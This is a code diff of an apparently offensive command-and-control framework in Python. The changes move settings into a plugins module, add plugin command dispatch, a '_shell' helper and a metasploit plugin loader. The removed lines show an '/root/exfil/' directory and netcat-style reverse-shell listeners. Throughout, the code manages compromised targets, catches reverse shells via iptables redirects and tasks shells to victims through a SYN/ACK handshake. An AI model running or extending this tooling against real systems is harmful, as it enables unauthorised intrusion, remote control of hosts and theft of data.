@@ -39,67 +39,13 @@ from colored import fg, bg, attr
 import shlex
 import pty
 
+import plugins
+from plugins.constants import *
 
-SETTINGS = {
-"exfil_dir":"/root/exfil/",
-"static_dir":"static/",
-"shell_dir":"shell/",
-"plugin_dir":"plugins/",
-"deploy_dir":"deploy/",
-#"default_shell_handler":"nc -nvlp {REAL_PORT};",
-#"default_shell_plugin":"False",
-"default_shell_handler":"switchblade/switchblade.py -p {REAL_PORT};",
-"default_shell_plugin":"True",
-"tmux_welcome":"tmux_welcome.sh",
-"LHOST":None,
-"LPORT":None,
-"RHOST":None,
-"target":None,
-"vars":["target", "LHOST", "LPORT", "RHOST", "STATIC_URL"],
-"protocol":"https",
-"STATIC_URL":None,
-"session_count":0
-}
-
-# identifier:{message:"", default:""};
-force_prompt = {}
-
-managed_sessions = []
-
-targets = []
-
-target_info_all = {}
-
-tasks = {}
-
-#target = None
-
-#{
-#target:{
-#   "cmd":"cmd to fix iptables"
-#}
-#}
-FIN_WAIT = {}
-
-style = Style.from_dict({
-    # User input (default text).
-    '':          '#ff0066',
-
-    # Prompt.
-    'username': '#cc4444',
-    'at':       '#00aa00',
-    'colon':    '#aa0000',
-    'pound':    '#00aa00',
-    'hostname':     '#00ffff bg:#0011bb',
-    'ip':     '#0dd000 bg:#0011bb',
-    'path':     'ansicyan underline',
-})
+style = Style.from_dict(style_dict)
 
 tmux = libtmux.Server()
 sess = PromptSession()
-
-curr_prompt = None
-
 
 class TrashCollector(BaseHTTPRequestHandler):
 
@@ -441,16 +387,17 @@ def iptables_redirect(host):
     return {"add":add_cmd, "del":del_cmd, "fix":fix_cmd, "delfix":delfix_cmd, "port":real_port}
 
 
-def get_listener_cmd(port):
-    cmd = SETTINGS["default_shell_handler"].format(REAL_PORT=port)
-    if SETTINGS["default_shell_plugin"] == "True":
-        prog = cmd.split(" ")[0]
-        prog = compute_path(cmd.split(" ")[0], SETTINGS["plugin_dir"])
-        if " " in cmd:
-            cmd = "{} {}".format(prog , " ".join(cmd.split(" ")[1:]))
-        else:
-            cmd = prog + cmd
-            
+def get_listener_cmd(target, port):
+    cmd = FIN_WAIT.get(target, {}).get("handler", None)
+    if not cmd:
+        cmd = SETTINGS["default_shell_handler"].format(REAL_PORT=port)
+        if SETTINGS["default_shell_plugin"] == "True":
+            prog = cmd.split(" ")[0]
+            prog = compute_path(cmd.split(" ")[0], SETTINGS["plugins_dir"])
+            if " " in cmd:
+                cmd = "{} {}".format(prog , " ".join(cmd.split(" ")[1:]))
+            else:
+                cmd = prog + cmd
     print (cmd)
     return cmd
     #return "nc -nvlp {REAL_PORT};".format(REAL_PORT=port)
@@ -467,7 +414,7 @@ def handle_shell(target, catch=False):
     #global tmux
     res = iptables_redirect(host)
 
-    listener = get_listener_cmd(res["port"])
+    listener = get_listener_cmd(target, res["port"])
     # Race conditions just make your code go faster, right?
     # DANGER: will not work correctly if using "catch"
     handler_cmd = res["add"] + listener
@@ -519,6 +466,22 @@ def options():
     for s in SETTINGS["vars"]:
         print("{0: <10}:  {1}".format(s, SETTINGS[s]))
 
+# Low level helper that plugins can use
+def _shell(s, h=None):
+    t = SETTINGS.get("target", None)
+    if t:
+        if t in FIN_WAIT:
+            print("A shell handshake for {} is in progress -- wait until shell_FIN is received".format(t))
+        else:
+            task(t, "shell_SYN", None)
+            print("Waiting for shell_ACK...")
+            FIN_WAIT[t] = {"shell":s}
+            if h:
+                FIN_WAIT[t]["handler"] = h
+    else:
+        print('Set a target - try "show targets"')
+
+
 def do(cmd):
     global managed_sessions
     #global tmux
@@ -532,6 +495,24 @@ def do(cmd):
         if not cmd:
             return
         c = arr[0]
+        
+        # TODO: Anything but this
+        # Let plugins handle commands that they exported (via get_cmds())
+        plugin_func = None
+        for pc in SETTINGS['plugin_cmds']:
+            if c == pc[0]:
+                plugin_func = pc[1]
+                break
+        if plugin_func:
+            args = ""
+            if cmd.startswith(c):
+                args = cmd[len(c):].lstrip(" ")
+            res = plugin_func(cmd, args)
+            if res:
+                for cmd in res:
+                    do(cmd)
+            return
+
         if c == "set":
             set(arr[1], arr[2] if len(arr) > 2 else None)
         elif c == "show" or (c in globals() and not callable(globals()[c])):
@@ -603,17 +584,7 @@ def do(cmd):
                 print("Reading from {}".format(shell_file))
                 s = get_shell(shell_file)
                 print(s)
-                t = SETTINGS.get("target", None)
-                if t:
-                    if t in FIN_WAIT:
-                        print("A shell handshake for {} is in progress -- wait until shell_FIN is received".format(t))
-                    else:
-                        task(t, "shell_SYN", None)
-                        print("Waiting for shell_ACK...")
-                        FIN_WAIT[t] = {"shell":s}
-                    
-                else:
-                    print('Set a target - try "show targets"')
+                _shell(s)        
             else:
                 print("Possible shells:")
                 for root, dirs, file in os.walk(SETTINGS['shell_dir']):
@@ -621,10 +592,20 @@ def do(cmd):
                         p = os.path.join(root, f)
                         p = p[len(os.path.commonprefix([SETTINGS['shell_dir'], p])):]
                         print(p)
-            
+
+        # For use by plugins only
+        elif c == "_shell":
+            shell_cmd = arr[1]
+            handler_cmd = None
+            if len(arr) > 2:
+                handler_cmd = arr[2]
+            _shell(arr[1], handler_cmd) 
         elif c == 'catch':
             rhost = arr[1]
-            handle_shell(rhost, catch=True)
+            listener_cmd = ""
+            if len(arr) > 2:
+                listener_cmd = arr[2]
+            handle_shell(rhost, catch=True, listener_cmd=listener_cmd)
         elif c == 'listen':
             rhost = first([SETTINGS["RHOST"], SETTINGS["target"], "0.0.0.0/0"])
             message = "Please set RHOST for the expected connection [{}]:".format(rhost)
@@ -852,6 +833,21 @@ async def get_input():
         #    os._exit(1)
         dbg = dbg - 1
 
+
+########################
+#
+#      Plugins
+#
+########################
+# Modify this when adding new plugins
+def load_plugins():
+    global metasploit
+    from plugins.metasploit import metasploit
+    
+    # (func_name, function)
+    SETTINGS['plugin_cmds'].extend([(c,getattr(globals()['metasploit'], c)) for c in metasploit.get_cmds()])
+    print("Loaded {} from metasploit".format(metasploit.get_cmds()))
+
 if __name__=="__main__":
     global loop
 
@@ -866,7 +862,7 @@ if __name__=="__main__":
     SETTINGS['LPORT'] = str(get_shell_port())
 
 
-    for d in ['static_dir', 'shell_dir', 'plugin_dir', 'deploy_dir' ,'tmux_welcome']:
+    for d in ['static_dir', 'shell_dir', 'plugins_dir', 'deploy_dir', 'payloads_dir', 'handlers_dir' ,'tmux_welcome']:
         SETTINGS[d] = compute_path(SETTINGS[d])
 
     try:
@@ -878,6 +874,8 @@ if __name__=="__main__":
     new_session(get_session_name("127.0.0.1"), keys_script=SETTINGS['tmux_welcome'])
 
     purge_nat()
+
+    load_plugins()
 
     srv_thread.start()
     prompt_toolkit.eventloop.defaults.use_asyncio_event_loop() 
